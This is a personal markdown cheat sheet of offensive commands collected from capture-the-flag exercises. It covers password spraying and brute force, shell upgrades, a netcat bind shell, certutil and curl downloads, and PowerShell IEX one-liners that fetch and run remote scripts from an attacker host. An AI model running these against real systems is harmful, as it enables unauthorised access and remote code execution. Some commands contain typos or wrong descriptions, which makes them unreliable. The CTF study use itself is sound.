# ctf_notes
notes gathered from doing numerous CTFs to help with further CTFs
<p> -----------------------------------------------------------------------------------------
<p> Windows & *nix:
<p> - password spraying:
<p> crackmapexec [module] -u [users.txt] -p [passwords.txt] [ip or ip range]
<p> - bruteforce (more options may be required, example used was SSH module):
<p> medusa -h [ip] -U [users.txt] -P [passwords.txt] -M [module] [ip] 
<p> general notes:
<p> known hosts ssh file will show all hosts the host has SSH'd into
<p> - command to reset a broke terminal session
<p> reset
<p> -----------------------------------------------------------------------------------------
</p>
<p> upgrade shell using python pty library and adds auto complete for steps 2+ :
<p> 1 - python -c 'import pty;pty.spawn("/bin/bash")'
<p> 2 - CTRL z
<p> 3 - stty raw -echo
<p> 4 - fg <enter key>
<p> 5 - export TERM=xterm
<p> -----------------------------------------------------------------------------------------


<p> - mysql syntax for navigation:
<p> show databases; (shows available databases)
<p> use [database name]; (selects database to use)
<p> show tables; (shows tables in database)
<p> describe [table name]; (shows more information on values inside table)
<p> select [table value] from [table]; (shows items inside the table values of the table)
  
<p> - file upload (works with powershell and linux):
<p> curl http://[ip]:[port]/[file] -output [file]






*nix:
common privilege escalation techniques:
- seeing if any commands can be run as sude:
sudo -l
- check which programs are avilable on the system for priviledge escalation and send errors away from output
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
- download all FTP contents (--no-passive if passive is not allowed):
wget -m htp:anonymous:anonymous@<remote IP> (--no-passive) 
- bind shell:
(victim) nc -lp <port> -e /bin/bash  (attacker) rlwrap nc <ip> <port>
- listing file/ directory structure:
find . 
- listing file structure and look for specific file/ directory name
find . | grep -i <word to look for>
- show all running processes:
ss -lntp
- 







Windows:

windows powershell locations:
c:\Windows\System32\    - 32 bit
c:\Windows\SysWow64\    - 32 bit
c:\Windows\SysNative\   - 64 bit


File download:
cmd.exe
- certutil -urlcache -f http://<ip>:<port>/<file> <file output>

powershell:
- file upload (will auto run any .ps1 scripts): 
powershell IEX(New-Object Net.WebClient).downloadString("http://<ip>:<port>/<file>")
- using powershell directly causes reverse shell crash:
echo 'IEX(Net-Object Net.WebClient).downloadString("http://<ip>:<port>/<file>")' | powershell -noprofile - 
  
